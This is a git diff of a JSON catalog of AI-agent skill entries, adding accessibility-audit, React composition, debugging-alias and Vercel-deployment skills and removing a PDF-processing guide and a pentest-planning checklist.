@@ -212,6 +212,63 @@
       "scrapedAt": "2026-01-29T06:57:49.795Z"
     },
     {
+      "id": "antigravity-accesslint-audit",
+      "name": "accesslint-audit",
+      "slug": "accesslint-audit",
+      "description": "Find and fix WCAG 2.2 accessibility issues. Two modes — report (sweep a codebase or page, produce a prioritized written report, no edits) and fix (audit→edit→verify loop on a target). Prefers direct-CDP live-DOM auditing; falls back to a browser-MCP composition or HTML-string audits.",
+      "category": "Creative & Media",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/accesslint-audit",
+      "content": "\nYou audit accessibility and optionally fix what's broken.\n\n## When to Use\n- Use this skill when the task matches this description: Find and fix WCAG 2.2 accessibility issues. Two modes — report (sweep a codebase or page, produce a prioritized written report, no edits) and fix (audit→edit→verify loop on a target). Prefers direct-CDP live-DOM auditing; falls back to a browser-MCP composition or HTML-string audits.\n\n## Pick a mode from the user's intent\n\n- **Report mode** — \"audit my codebase\", \"review src/components/\", \"what's wrong with this page?\", \"give me an a11y report\". You audit + write a report. **You do not edit files.**\n- **Fix mode** — \"fix the a11y issues in X\", \"audit and fix\", \"make this accessible\", \"verify the contrast fix landed\", or hands you a violation report and asks to apply it. You audit → edit → verify.\n\nIf unsure, ask. Don't default-to-fix when the user only asked for an audit.\n\nFor very large sweeps where main-thread context cost matters, you can be invoked via `Task` (general-purpose agent) for context isolation. The recipe is the same either way.\n\n## Picking a flow\n\nThree flows, in order of preference.\n\n1. **`audit_live`** — try first for any URL. Connects to a running Chrome debug session, or auto-launches Chrome minimized — no user setup needed. Single call; IIFE bytes don't enter your context.\n2. **`audit-live-page` prompt** — use when the user needs their **existing browser session** audited (authenticated app, specific state) and a browser MCP (chrome-devtools-mcp, playwright-mcp, puppeteer-mcp) is connected. Invoke via `Skill` with `mode: \"fix\"` or `mode: \"plan\"`.\n3. **`audit_html`** — for raw HTML strings, files (`Read` first, then `audit_html`), or JSX you've rendered to a string. Pair with `audit_diff({ html })` for fix-mode verification.\n\nFor non-URL targets, skip straight to flow 3. For URLs, try flow 1; on auto-launch failure, try flow 2 if a browser MCP is connected; otherwise fall back to flow 3 with a note that live-DOM coverage is limited.\n\n## Scope handling (report mode)\n\n- **Directory path** — analyze all relevant files within.\n- **Multiple files** — analyze the listed files plus imports they reach.\n- **A URL** — audit it. If it's a dev-server URL, that's flow 1 or 2.\n- **No arguments** — ask the user to narrow scope. Whole-codebase sweeps are rarely the right thing.\n\nState the scope explicitly at the start of your report.\n\n## Approach (report mode)\n\n1. **Map the surface.** Glob/Grep to enumerate components, templates, styles. Sample representative files; don't open everything blindly.\n2. **Audit live where possible** — the rendered DOM catches issues source can't show. Use the flow picker above.\n3. **Look for patterns.** If one component fails a rule, similar components likely do too. Group by rule ID and component family — don't list 30 instances of the same issue 30 times.\n4. **Prioritize by user impact.** Critical/serious first. Many low-impact violations of one rule are often a single root-cause fix.\n5. **Use `format: \"compact\"` for sweep-time calls.** Reserve verbose output for rules you'll expand in the report.\n6. **Trust `Source:` lines.** Live-DOM audits against React dev builds attach `Source: <file>:<line> (Symbol)` per violation via DevTools fibers. Use it as the file pointer instead of grepping selectors. Fall back to stable hooks → visible text → tree position when absent.\n7. **Stop and ask if a single audit returns more than ~50 violations** — a 200-violation report isn't actionable.\n\nThe engine catches what's mechanically detectable. Manual judgment is needed for content clarity, screen-reader announcement quality, keyboard flow coherence, and complex visual contrast — flag those for human review, don't guess.\n\n### Report format\n\n```\n# Accessibility audit — <scope>\n\n## Summary\n- N critical, M serious, K moderate, J minor (after deduplication)\n- Most impactful patterns: <one-line each, max 3>\n\n## Critical (blocks access)\nFor each pattern:\n- **Pattern**: <one-line description>\n- **WCAG**: <ID> — <name>\n- **Affected files**: <file:line> (×N if repeated)\n- **Fix**: <directive from engine output, or specific code change>\n- **Why critical**: <user impact>\n\n## Serious\n[same shape]\n\n## Moderate / Minor\n[Bullet list, deduplicated by rule. Skip per-instance detail unless the fix differs.]\n\n## Recommendations\n- Architectural / pattern-level changes that would prevent recurrence.\n- Tooling or component abstractions worth introducing.\n- What to verify manually (screen reader, keyboard, low-vision testing).\n\n## Positive findings\nWhat the codebase does well — short, factual, reinforces practices to keep.\n```\n\nInclude rule IDs in every entry. Quote the `Fix:` directive verbatim for `mechanical` rules. For `visual` / `contextual`, leave a `TODO` with the rule ID; don't invent content.\n\n## Recipe (fix mode)\n\n1. **Baseline.** Audit with `name: \"before\"` and `format: \"compact\"`.\n2. **Plan + apply.** For each violation:\n   - `Source:` line present → open that file at ",
+      "tags": [
+        "react",
+        "mcp",
+        "ai",
+        "agent",
+        "template",
+        "rag"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-06-04T10:04:54.913Z"
+    },
+    {
+      "id": "antigravity-accesslint-diff",
+      "name": "accesslint-diff",
+      "slug": "accesslint-diff",
+      "description": "Diff a live page's accessibility violations against a baseline — by default compares uncommitted changes (stash-based), or pass --branch [<name>] to diff against a branch. Reports only new violations introduced, violations fixed, and pre-existing count. Use `scan` for a full audit with no diffing.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/accesslint-diff",
+      "content": "\nDefault branch: !`git symbolic-ref refs/remotes/origin/HEAD --short 2>/dev/null | sed 's|.*/||' || echo main`\n\nReport only what changed. Locate; don't fix. If no URL in `$ARGUMENTS`, ask for one.\n\nParse `$ARGUMENTS`: strip `--branch <name>` if present → branch mode. If `--branch` has no value, use the default branch above. Remainder is the URL.\n\n## When to Use\n- Use this skill when the task matches this description: Diff a live page's accessibility violations against a baseline — by default compares uncommitted changes (stash-based), or pass --branch [<name>] to diff against a branch. Reports only new violations introduced, violations fixed, and pre-existing count. Use `scan` for a full audit with no diffing.\n\n## 1. Audit\n\n```bash\nPORT=$(npx -y @accesslint/chrome@latest ensure | node -e 'process.stdin.on(\"data\",d=>process.stdout.write(\"\"+JSON.parse(d).port))')\n```\n\n**Stash mode** (default — uncommitted changes). Tell the user first: _\"Running in diff mode — stashing your changes to capture a baseline, then restoring. Your working tree will be fully restored.\"_ If `git stash push` fails, warn and exit.\n\n```bash\ngit stash push -u -m \"accesslint-diff-baseline\"\nnpx -y @accesslint/cli@latest \"<url>\" --port \"$PORT\" --snapshot accesslint-diff --snapshot-dir /tmp --update-snapshot\ngit stash pop && sleep 2\nnpx -y @accesslint/cli@latest \"<url>\" --port \"$PORT\" --snapshot accesslint-diff --snapshot-dir /tmp --format json\n```\n\n**Branch mode** (`--branch <name>`). Tell the user first: _\"Diffing against `<name>` — checking out that branch to capture a baseline, then restoring. Your working tree will be fully restored.\"_\n\nBranch switching triggers a rebuild but not a browser reload — the CLI opens a fresh tab each time so it always reads the current build. Use `--wait-for \"<selector>\"` to gate the audit until the rebuild is ready; without it, warn the user that a slow build may yield a stale baseline.\n\n```bash\ngit diff --quiet && git diff --cached --quiet || git stash push -u -m \"accesslint-diff-branch\"\ngit checkout <branch>\nnpx -y @accesslint/cli@latest \"<url>\" --port \"$PORT\" --snapshot accesslint-diff --snapshot-dir /tmp --update-snapshot [--wait-for \"<selector>\"]\ngit checkout - && git stash pop 2>/dev/null\nnpx -y @accesslint/cli@latest \"<url>\" --port \"$PORT\" --snapshot accesslint-diff --snapshot-dir /tmp --format json [--wait-for \"<selector>\"]\n```\n\nPass `--selector`, `--include-aaa` to **both** runs.\n\n## 2. Report\n\n```\nAccessibility diff — http://localhost:3000/ vs main (94 rules, live DOM)\n2 new · 1 fixed · 4 pre-existing hidden\n\nNew — Critical\n- color-contrast — 2.1:1 (needs 4.5:1), #bbb on #fff\n    where: main > p.subtitle   fix: darken to #767676\nFixed\n- img-alt — <img src=\"old.jpg\"> (no longer present)\n```\n\nEach new violation: **where** (selector verbatim + `file:line (symbol)` if `source` present — never fabricate), **evidence**, **fix** (mechanical change or `NEEDS HUMAN`).\n\nDon't edit. For fixes: apply mechanical ones then re-run `accesslint:diff` to verify; for bulk work hand off to `accesslint:audit`.\n\n## 3. Tear down\n\n```bash\nnpx -y @accesslint/chrome@latest stop --all  # skip if ensure reported \"managed\":false\n```\n\n## Gotchas\n\n- `ensure` always determines the port — never hardcode 9222.\n- CLI exit 2 = bad URL or page never loaded; check the dev server.\n- Stash mode: `sleep 2` covers most HMR cases; if baseline looks identical to current, add `--wait-for \"<selector>\"`.\n- Branch mode: no HMR — CLI opens a fresh tab each run. `--wait-for` is the rebuild gate.\n- Heavy DOM changes between runs cause selector drift — re-run with `accesslint:scan` for the full picture.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
+      "tags": [
+        "node",
+        "ai"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-06-04T10:04:55.332Z"
+    },
+    {
+      "id": "antigravity-accesslint-scan",
+      "name": "accesslint-scan",
+      "slug": "accesslint-scan",
+      "description": "Audit a live page for accessibility issues, locate each WCAG violation precisely, and return a selector-grounded fix worklist without editing.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/accesslint-scan",
+      "content": "\nAudit a live page and report what's broken and where. Locate; don't fix. If no URL in `$ARGUMENTS`, ask for one.\n\n## When to Use\n- Use this skill when the task matches this description: Audit a live page for accessibility issues, locate each WCAG violation precisely, and return a selector-grounded fix worklist without editing.\n\n## 1. Audit\n\n```bash\nPORT=$(npx -y @accesslint/chrome@latest ensure | node -e 'process.stdin.on(\"data\",d=>process.stdout.write(\"\"+JSON.parse(d).port))')\nnpx -y @accesslint/cli@latest \"<url>\" --port \"$PORT\" --format json\n```\n\nFlags as needed: `--selector`, `--wait-for \"<selector>\"`, `--include-aaa`, `--disable <rules>`.\n\n## 2. Report\n\nCounts by impact, then one entry per violation:\n\n- **where** — selector verbatim + `file:line (symbol)` if `source` is present — never fabricate. If no violation has `source`, note \"source mapping unavailable — located by selector only\".\n- **evidence** — contrast ratio, missing attribute, empty name\n- **fix** — mechanical change or `NEEDS HUMAN`\n\nDon't edit. For fixes: apply mechanical ones then re-run to verify; for bulk work hand off to `accesslint:audit`.\n\n## 3. Tear down\n\n```bash\nnpx -y @accesslint/chrome@latest stop --all  # skip if ensure reported \"managed\":false\n```\n\n## Gotchas\n\n- `ensure` always determines the port — never hardcode 9222.\n- CLI exit 2 = bad URL or page never loaded; check the dev server.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
+      "tags": [
+        "node",
+        "ai"
+      ],
+      "useCases": [
+        "Use this skill when the task matches this description: Audit a live page for accessibility issues, locate each WCAG violation precisely, and return a selector-grounded fix worklist without editing."
+      ],
+      "scrapedAt": "2026-06-04T10:04:55.780Z"
+    },
+    {
       "id": "antigravity-active-directory-attacks",
       "name": "active-directory-attacks",
       "slug": "active-directory-attacks",
@@ -9604,6 +9661,34 @@
       "scrapedAt": "2026-05-28T10:16:09.160Z"
     },
     {
+      "id": "antigravity-composition-patterns",
+      "name": "composition-patterns",
+      "slug": "composition-patterns",
+      "description": "Use when working with composition-patterns tasks or workflows",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/composition-patterns",
+      "content": "\n# React Composition Patterns\n\nComposition patterns for building flexible, maintainable React components. Avoid\nboolean prop proliferation by using compound components, lifting state, and\ncomposing internals. These patterns make codebases easier for both humans and AI\nagents to work with as they scale.\n\n## When to Use\nReference these guidelines when:\n\n- Refactoring components with many boolean props\n- Building reusable component libraries\n- Designing flexible component APIs\n- Reviewing component architecture\n- Working with compound components or context providers\n\n## Rule Categories by Priority\n\n| Priority | Category                | Impact | Prefix          |\n| -------- | ----------------------- | ------ | --------------- |\n| 1        | Component Architecture  | HIGH   | `architecture-` |\n| 2        | State Management        | MEDIUM | `state-`        |\n| 3        | Implementation Patterns | MEDIUM | `patterns-`     |\n| 4        | React 19 APIs           | MEDIUM | `react19-`      |\n\n## Quick Reference\n\n### 1. Component Architecture (HIGH)\n\n- `architecture-avoid-boolean-props` - Don't add boolean props to customize\n  behavior; use composition\n- `architecture-compound-components` - Structure complex components with shared\n  context\n\n### 2. State Management (MEDIUM)\n\n- `state-decouple-implementation` - Provider is the only place that knows how\n  state is managed\n- `state-context-interface` - Define generic interface with state, actions, meta\n  for dependency injection\n- `state-lift-state` - Move state into provider components for sibling access\n\n### 3. Implementation Patterns (MEDIUM)\n\n- `patterns-explicit-variants` - Create explicit variant components instead of\n  boolean modes\n- `patterns-children-over-render-props` - Use children for composition instead\n  of renderX props\n\n### 4. React 19 APIs (MEDIUM)\n\n> **⚠️ React 19+ only.** Skip this section if using React 18 or earlier.\n\n- `react19-no-forwardref` - Don't use `forwardRef`; use `use()` instead of `useContext()`\n\n## How to Use\n\nRead individual rule files for detailed explanations and code examples:\n\n```\nrules/architecture-avoid-boolean-props.md\nrules/state-context-interface.md\n```\n\nEach rule file contains:\n\n- Brief explanation of why it matters\n- Incorrect code example with explanation\n- Correct code example with explanation\n- Additional context and references\n\n## Full Compiled Document\n\nFor the complete guide with all rules expanded: `AGENTS.md`\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
+      "tags": [
+        "react",
+        "api",
+        "ai",
+        "agent",
+        "workflow",
+        "design",
+        "document"
+      ],
+      "useCases": [
+        "Refactoring components with many boolean props",
+        "Building reusable component libraries",
+        "Designing flexible component APIs",
+        "Reviewing component architecture",
+        "Working with compound components or context providers"
+      ],
+      "scrapedAt": "2026-06-04T10:07:34.191Z"
+    },
+    {
       "id": "antigravity-comprehensive-review-full-review",
       "name": "comprehensive-review-full-review",
       "slug": "comprehensive-review-full-review",
@@ -11724,6 +11809,22 @@
       "scrapedAt": "2026-01-29T06:58:42.720Z"
     },
     {
+      "id": "antigravity-debugging-toolkit",
+      "name": "debugging-toolkit",
+      "slug": "debugging-toolkit",
+      "description": "Use when working with debugging toolkit smart debug (Alias for debugging-toolkit-smart-debug)",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/debugging-toolkit",
+      "content": "\n# Debugging Toolkit\n\n> **This is an alias.** The canonical skill is **`debugging-toolkit-smart-debug`**.\n\nThis skill redirects to `debugging-toolkit-smart-debug`. Load it from the vault:\n\n`skill-libraries/code-quality/debugging-toolkit-smart-debug/SKILL.md`\n\n## When to Use\n- Use this skill when working with debugging toolkit smart debug (Alias for debugging-toolkit-smart-debug)\n\n## Why this alias exists\n\nUsers commonly search for `debugging-toolkit` but the full skill name in this collection is `debugging-toolkit-smart-debug`. This alias ensures discoverability.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n\n## Examples\n```text\nUse @debugging-toolkit for this task: Use when working with debugging toolkit smart debug (Alias for debugging-toolkit-smart-debug).\n\nApply the skill to my current work and walk me through the safest next steps,\nkey checks, and the concrete output I should produce.\n```\n",
+      "tags": [],
+      "useCases": [
+        "Use this skill when working with debugging toolkit smart debug (Alias for debugging-toolkit-smart-debug)"
+      ],
+      "scrapedAt": "2026-06-04T10:08:12.310Z"
+    },
+    {
       "id": "antigravity-debugging-toolkit-smart-debug",
       "name": "debugging-toolkit-smart-debug",
       "slug": "debugging-toolkit-smart-debug",
@@ -11901,6 +12002,25 @@
         "-transform react-codeshift/transforms/rename-unsafe-lifecycles.js \\"
       ],
       "scrapedAt": "2026-01-29T06:58:44.262Z"
+    },
+    {
+      "id": "antigravity-deploy-to-vercel",
+      "name": "deploy-to-vercel",
+      "slug": "deploy-to-vercel",
+      "description": "Deploy applications and websites to Vercel. Use when the user requests deployment actions like \"deploy my app\", \"deploy and give me the link\", \"push this live\", or \"create a preview deployment\".",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/deploy-to-vercel",
+      "content": "\n# Deploy to Vercel\n\nDeploy any project to Vercel. **Always deploy as preview** (not production) unless the user explicitly asks for production.\n\nThe goal is to get the user into the best long-term setup: their project linked to Vercel with git-push deploys. Every method below tries to move the user closer to that state.\n\n## When to Use\n- Use this skill when the task matches this description: Deploy applications and websites to Vercel. Use when the user requests deployment actions like \"deploy my app\", \"deploy and give me the link\", \"push this live\", or \"create a preview deployment\".\n\n## Step 1: Gather Project State\n\nRun all four checks before deciding which method to use:\n\n```bash\n# 1. Check for a git remote\ngit remote get-url origin 2>/dev/null\n\n# 2. Check if locally linked to a Vercel project (either file means linked)\ncat .vercel/project.json 2>/dev/null || cat .vercel/repo.json 2>/dev/null\n\n# 3. Check if the Vercel CLI is installed and authenticated\nvercel whoami 2>/dev/null\n\n# 4. List available teams (if authenticated)\nvercel teams list --format json 2>/dev/null\n```\n\n### Team selection\n\nIf the user belongs to multiple teams, present all available team slugs as a bulleted list and ask which one to deploy to. Once the user picks a team, proceed immediately to the next step — do not ask for additional confirmation.\n\nPass the team slug via `--scope` on all subsequent CLI commands (`vercel deploy`, `vercel link`, `vercel inspect`, etc.):\n\n```bash\nvercel deploy [path] -y --no-wait --scope <team-slug>\n```\n\nIf the project is already linked (`.vercel/project.json` or `.vercel/repo.json` exists), the `orgId` in those files determines the team — no need to ask again. If there is only one team (or just a personal account), skip the prompt and use it directly.\n\n**About the `.vercel/` directory:** A linked project has either:\n- `.vercel/project.json` — created by `vercel link` (single project linking). Contains `projectId` and `orgId`.\n- `.vercel/repo.json` — created by `vercel link --repo` (repo-based linking). Contains `orgId`, `remoteName`, and a `projects` array mapping directories to Vercel project IDs.\n\nEither file means the project is linked. Check for both.\n\n**Do NOT** use `vercel project inspect`, `vercel ls`, or `vercel link` to detect state in an unlinked directory — without a `.vercel/` config, they will interactively prompt (or with `--yes`, silently link as a side-effect). Only `vercel whoami` is safe to run anywhere.\n\n## Step 2: Choose a Deploy Method\n\n### Linked (`.vercel/` exists) + has git remote → Git Push\n\nThis is the ideal state. The project is linked and has git integration.\n\n1. **Ask the user before pushing.** Never push without explicit approval:\n   ```\n   This project is connected to Vercel via git. I can commit and push to\n   trigger a deployment. Want me to proceed?\n   ```\n\n2. **Commit and push:**\n   ```bash\n   git add .\n   git commit -m \"deploy: <description of changes>\"\n   git push\n   ```\n   Vercel automatically builds from the push. Non-production branches get preview deployments; the production branch (usually `main`) gets a production deployment.\n\n3. **Retrieve the preview URL.** If the CLI is authenticated:\n   ```bash\n   sleep 5\n   vercel ls --format json\n   ```\n   The JSON output has a `deployments` array. Find the latest entry — its `url` field is the preview URL.\n\n   If the CLI is not authenticated, tell the user to check the Vercel dashboard or the commit status checks on their git provider for the preview URL.\n\n---\n\n### Linked (`.vercel/` exists) + no git remote → `vercel deploy`\n\nThe project is linked but there's no git repo. Deploy directly with the CLI.\n\n```bash\nvercel deploy [path] -y --no-wait\n```\n\nUse `--no-wait` so the CLI returns immediately with the deployment URL instead of blocking until the build finishes (builds can take a while). Then check on the deployment status with:\n\n```bash\nvercel inspect <deployment-url>\n```\n\nFor production deploys (only if user explicitly asks):\n```bash\nvercel deploy [path] --prod -y --no-wait\n```\n\n---\n\n### Not linked + CLI is authenticated → Link first, then deploy\n\nThe CLI is working but the project isn't linked yet. This is the opportunity to get the user into the best state.\n\n1. **Ask the user which team to deploy to.** Present the team slugs from Step 1 as a bulleted list. If there's only one team (or just a personal account), skip this step.\n\n2. **Once a team is selected, proceed directly to linking.** Tell the user what will happen but do not ask for separate confirmation:\n   ```\n   Linking this project to <team name> on Vercel. This will create a Vercel\n   project to deploy to and enable automatic deployments on future git pushes.\n   ```\n\n3. **If a git remote exists**, use repo-based linking with the selected team scope:\n   ```bash\n   vercel link --repo --scope <team-slug>\n   ```\n   This reads the git remote URL and matches it to existing Vercel projects that deploy from that repo. It creates `.vercel/repo.json`. This is much more ",
+      "tags": [
+        "node",
+        "claude",
+        "ai",
+        "agent"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-06-04T10:08:15.244Z"
     },
     {
       "id": "antigravity-deployment-engineer",
@@ -25758,31 +25878,6 @@
       "scrapedAt": "2026-05-24T08:42:37.980Z"
     },
     {
-      "id": "antigravity-pdf-official",
-      "name": "pdf-official",
-      "slug": "pdf-official",
-      "description": "This guide covers essential PDF processing operations using Python libraries and command-line tools. For advanced features, JavaScript libraries, and detailed examples, see reference.md. If you need to fill out a PDF form, read forms.md and follow its instructions.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pdf-official",
-      "content": "\n# PDF Processing Guide\n\n## Overview\n\nThis guide covers essential PDF processing operations using Python libraries and command-line tools. For advanced features, JavaScript libraries, and detailed examples, see reference.md. If you need to fill out a PDF form, read forms.md and follow its instructions.\n\n## Quick Start\n\n```python\nfrom pypdf import PdfReader, PdfWriter\n\n# Read a PDF\nreader = PdfReader(\"document.pdf\")\nprint(f\"Pages: {len(reader.pages)}\")\n\n# Extract text\ntext = \"\"\nfor page in reader.pages:\n    text += page.extract_text()\n```\n\n## Python Libraries\n\n### pypdf - Basic Operations\n\n#### Merge PDFs\n```python\nfrom pypdf import PdfWriter, PdfReader\n\nwriter = PdfWriter()\nfor pdf_file in [\"doc1.pdf\", \"doc2.pdf\", \"doc3.pdf\"]:\n    reader = PdfReader(pdf_file)\n    for page in reader.pages:\n        writer.add_page(page)\n\nwith open(\"merged.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n#### Split PDF\n```python\nreader = PdfReader(\"input.pdf\")\nfor i, page in enumerate(reader.pages):\n    writer = PdfWriter()\n    writer.add_page(page)\n    with open(f\"page_{i+1}.pdf\", \"wb\") as output:\n        writer.write(output)\n```\n\n#### Extract Metadata\n```python\nreader = PdfReader(\"document.pdf\")\nmeta = reader.metadata\nprint(f\"Title: {meta.title}\")\nprint(f\"Author: {meta.author}\")\nprint(f\"Subject: {meta.subject}\")\nprint(f\"Creator: {meta.creator}\")\n```\n\n#### Rotate Pages\n```python\nreader = PdfReader(\"input.pdf\")\nwriter = PdfWriter()\n\npage = reader.pages[0]\npage.rotate(90)  # Rotate 90 degrees clockwise\nwriter.add_page(page)\n\nwith open(\"rotated.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n### pdfplumber - Text and Table Extraction\n\n#### Extract Text with Layout\n```python\nimport pdfplumber\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for page in pdf.pages:\n        text = page.extract_text()\n        print(text)\n```\n\n#### Extract Tables\n```python\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for i, page in enumerate(pdf.pages):\n        tables = page.extract_tables()\n        for j, table in enumerate(tables):\n            print(f\"Table {j+1} on page {i+1}:\")\n            for row in table:\n                print(row)\n```\n\n#### Advanced Table Extraction\n```python\nimport pandas as pd\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    all_tables = []\n    for page in pdf.pages:\n        tables = page.extract_tables()\n        for table in tables:\n            if table:  # Check if table is not empty\n                df = pd.DataFrame(table[1:], columns=table[0])\n                all_tables.append(df)\n\n# Combine all tables\nif all_tables:\n    combined_df = pd.concat(all_tables, ignore_index=True)\n    combined_df.to_excel(\"extracted_tables.xlsx\", index=False)\n```\n\n### reportlab - Create PDFs\n\n#### Basic PDF Creation\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.pdfgen import canvas\n\nc = canvas.Canvas(\"hello.pdf\", pagesize=letter)\nwidth, height = letter\n\n# Add text\nc.drawString(100, height - 100, \"Hello World!\")\nc.drawString(100, height - 120, \"This is a PDF created with reportlab\")\n\n# Add a line\nc.line(100, height - 140, 400, height - 140)\n\n# Save\nc.save()\n```\n\n#### Create PDF with Multiple Pages\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak\nfrom reportlab.lib.styles import getSampleStyleSheet\n\ndoc = SimpleDocTemplate(\"report.pdf\", pagesize=letter)\nstyles = getSampleStyleSheet()\nstory = []\n\n# Add content\ntitle = Paragraph(\"Report Title\", styles['Title'])\nstory.append(title)\nstory.append(Spacer(1, 12))\n\nbody = Paragraph(\"This is the body of the report. \" * 20, styles['Normal'])\nstory.append(body)\nstory.append(PageBreak())\n\n# Page 2\nstory.append(Paragraph(\"Page 2\", styles['Heading1']))\nstory.append(Paragraph(\"Content for page 2\", styles['Normal']))\n\n# Build PDF\ndoc.build(story)\n```\n\n## Command-Line Tools\n\n### pdftotext (poppler-utils)\n```bash\n# Extract text\npdftotext input.pdf output.txt\n\n# Extract text preserving layout\npdftotext -layout input.pdf output.txt\n\n# Extract specific pages\npdftotext -f 1 -l 5 input.pdf output.txt  # Pages 1-5\n```\n\n### qpdf\n```bash\n# Merge PDFs\nqpdf --empty --pages file1.pdf file2.pdf -- merged.pdf\n\n# Split pages\nqpdf input.pdf --pages . 1-5 -- pages1-5.pdf\nqpdf input.pdf --pages . 6-10 -- pages6-10.pdf\n\n# Rotate pages\nqpdf input.pdf output.pdf --rotate=+90:1  # Rotate page 1 by 90 degrees\n\n# Remove password\nqpdf --password=mypassword --decrypt encrypted.pdf decrypted.pdf\n```\n\n### pdftk (if available)\n```bash\n# Merge\npdftk file1.pdf file2.pdf cat output merged.pdf\n\n# Split\npdftk input.pdf burst\n\n# Rotate\npdftk input.pdf rotate 1east output rotated.pdf\n```\n\n## Common Tasks\n\n### Extract Text from Scanned PDFs\n```python\n# Requires: pip install pytesseract pdf2image\nimport pytesseract\nfrom pdf2image import convert_from_path\n\n# Convert PDF to images\nimages = convert_from_path('scanned.pdf')\n\n# OCR each page\ntext = \"\"\nfor i, image in enumerate(images):\n    text += f\"Page {i+1}:\\n\"\n    text += pytesseract",
-      "tags": [
-        "python",
-        "javascript",
-        "pdf",
-        "xlsx",
-        "ai",
-        "workflow",
-        "template",
-        "document",
-        "image",
-        "aws"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:08.298Z"
-    },
-    {
       "id": "openhands-pdflatex",
       "name": "pdflatex",
       "slug": "pdflatex",
@@ -25800,136 +25895,6 @@
       ],
       "useCases": [],
       "scrapedAt": "2026-01-26T13:15:31.764Z"
-    },
-    {
-      "id": "antigravity-pentest-checklist",
-      "name": "pentest-checklist",
-      "slug": "pentest-checklist",
-      "description": "Provide a comprehensive checklist for planning, executing, and following up on penetration tests. Ensure thorough preparation, proper scoping, and effective remediation of discovered vulnerabilities.",
-      "category": "Security & Systems",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pentest-checklist",
-      "content": "\n> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.\n\n# Pentest Checklist\n\n## Purpose\n\nProvide a comprehensive checklist for planning, executing, and following up on penetration tests. Ensure thorough preparation, proper scoping, and effective remediation of discovered vulnerabilities.\n\n## Inputs/Prerequisites\n\n- Clear business objectives for testing\n- Target environment information\n- Budget and timeline constraints\n- Stakeholder contacts and authorization\n- Legal agreements and scope documents\n\n## Outputs/Deliverables\n\n- Defined pentest scope and objectives\n- Prepared testing environment\n- Security monitoring data\n- Vulnerability findings report\n- Remediation plan and verification\n\n## Core Workflow\n\n### Phase 1: Scope Definition\n\n#### Define Objectives\n\n- [ ] **Clarify testing purpose** - Determine goals (find vulnerabilities, compliance, customer assurance)\n- [ ] **Validate pentest necessity** - Ensure penetration test is the right solution\n- [ ] **Align outcomes with objectives** - Define success criteria\n\n**Reference Questions:**\n- Why are you doing this pentest?\n- What specific outcomes do you expect?\n- What will you do with the findings?\n\n#### Know Your Test Types\n\n| Type | Purpose | Scope |\n|------|---------|-------|\n| External Pentest | Assess external attack surface | Public-facing systems |\n| Internal Pentest | Assess insider threat risk | Internal network |\n| Web Application | Find application vulnerabilities | Specific applications |\n| Social Engineering | Test human security | Employees, processes |\n| Red Team | Full adversary simulation | Entire organization |\n\n#### Enumerate Likely Threats\n\n- [ ] **Identify high-risk areas** - Where could damage occur?\n- [ ] **Assess data sensitivity** - What data could be compromised?\n- [ ] **Review legacy systems** - Old systems often have vulnerabilities\n- [ ] **Map critical assets** - Prioritize testing targets\n\n#### Define Scope\n\n- [ ] **List in-scope systems** - IPs, domains, applications\n- [ ] **Define out-of-scope items** - Systems to avoid\n- [ ] **Set testing boundaries** - What techniques are allowed?\n- [ ] **Document exclusions** - Third-party systems, production data\n\n#### Budget Planning\n\n| Factor | Consideration |\n|--------|---------------|\n| Asset Value | Higher value = higher investment |\n| Complexity | More systems = more time |\n| Depth Required | Thorough testing costs more |\n| Reputation Value | Brand-name firms cost more |\n\n**Budget Reality Check:**\n- Cheap pentests often produce poor results\n- Align budget with asset criticality\n- Consider ongoing 